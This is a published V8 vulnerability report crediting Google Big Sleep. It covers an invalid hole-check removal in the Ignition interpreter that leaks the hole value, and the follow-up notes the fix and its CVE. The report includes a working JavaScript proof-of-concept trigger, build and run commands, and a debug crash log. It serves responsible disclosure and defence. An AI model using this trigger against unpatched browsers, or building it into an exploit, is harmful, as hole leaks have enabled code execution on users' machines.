# 449910706

Issue URL: https://issuetracker.google.com/issues/449910706
VRP-Reward: INT
Date: Oct 7, 2025 06:11PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID `BIGSLEEP-449910706`. Please use this identifier for reference in any future communication.

## **Vulnerability Details**

There is a hole leak due to an invalid hole-check removal in the Ignition interpreter.

JavaScript variables declared with `let` (or `const`) cannot be used before they are initialized (in contrast to `var` variables which will be `undefined`). In V8, this is implemented by initially setting the variable’s value to the special `hole` value and adding hole checks that raise an exception if a variable is used before it is initialized. As an optimization, V8’s bytecode compiler then attempts to remove redundant hole checks by analyzing the bytecode’s structure and looking for hole checks that are dominated by previous hole checks, in which case they are redundant and can be removed.

However, for the sample below, this optimization fails and incorrectly removes a hole check. In particular, it fails to realize that the hole check in the do-while loop’s footer does _not_ dominate the hole check after the switch statement as it can be skipped due to the labelled break operation. As such, when `x` is used after the switch statement, its value is still `the_hole` but the hole check has been eliminated, leading to `the_hole` being leaked into JavaScript. This can be seen in the crash log or by uncommenting the `%DebugPrint`.

As hole leaks have been exploitable in the past, we’re reporting this issue as a high-severity vulnerability, although recent hardening around hole leaks [1] may affect the exploitability of this bug in the future.

[1] [https://crbug.com/434179415](<https://crbug.com/434179415>)

## **Affected Version(s)**

The issue has been successfully reproduced:

  * at HEAD (commit e53002532ca9428582bf8726322d5fe191b8a094)
  * in stable release 14.1.146.11 (commit ad8af0fc661d278e87627fcaa3a7cf795ee80dd8)

## **Reproduction**

### **Test Case**

```
function trigger(cond) {
  {
    target: switch(1) {
      case 1:
        do {
          if (cond) break target;
        } while((x=1) && false);
        break;
      default:
        x=1;
    }
    // %DebugPrint(x);
    print(x);   // crash here due to seeing a hole
    let x;
  }
}
trigger(true);
```

### **Build Instructions**

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a debug build:

```
gm.py x64.debug
```

### **Command**

```
./out/x64.debug/d8 crash.js
```

### **ASan Report**

```
#
# Fatal error in ../../src/api/api.cc, line 831
# Debug check failed: !IsTheHole(heap_object).
#
#
#
#FailureMessage Object: 0x7b0426d6e860
==== C stack trace ===============================
    ./out/x64.debug/d8(___interceptor_backtrace+0x46) [0x559d6ecf7d96]
    v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f042a9d689e]
    v8/v8/out/x64.debug/libv8_libplatform.so(+0x7e07b) [0x7f04426f207b]
    v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x2e2) [0x7f042a97c002]
    v8/v8/out/x64.debug/libv8_libbase.so(+0x87727) [0x7f042a97b727]
    v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x4d) [0x7f042a97c14d]
    v8/v8/out/x64.debug/libv8.so(v8::Data::IsValue() const+0x25b) [0x7f0435bb151b]
    v8/v8/out/x64.debug/libv8.so(bool v8::internal::ValidateFunctionCallbackInfo<v8::Value>(v8::FunctionCallbackInfo<v8::Value> const&)+0x295) [0x7f0435cc0115]
    v8/v8/out/x64.debug/libv8.so(bool v8::internal::ValidateCallbackInfo<v8::Value>(v8::FunctionCallbackInfo<v8::Value> const&)+0x15) [0x7f0435c60805]
    ./out/x64.debug/d8(v8::WriteAndFlush(_IO_FILE*, v8::FunctionCallbackInfo<v8::Value> const&)+0x19) [0x559d6ee43379]
    ./out/x64.debug/d8(v8::Shell::Print(v8::FunctionCallbackInfo<v8::Value> const&)+0x3f) [0x559d6ee4340f]
    v8/v8/out/x64.debug/libv8.so(+0xa0a0450) [0x7f0434aa0450]
```

## **Reporter Credit**

Google Big Sleep

## **Disclosure Policy**

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is `2026-01-05`.

For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — gl...@google.com — Nov 12, 2025 01:55AM**

This issue was fixed in the 2025-10-28 Chrome 142.0.7444.59 release ([https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html](<https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html>)) and assigned CVE-2025-12433.
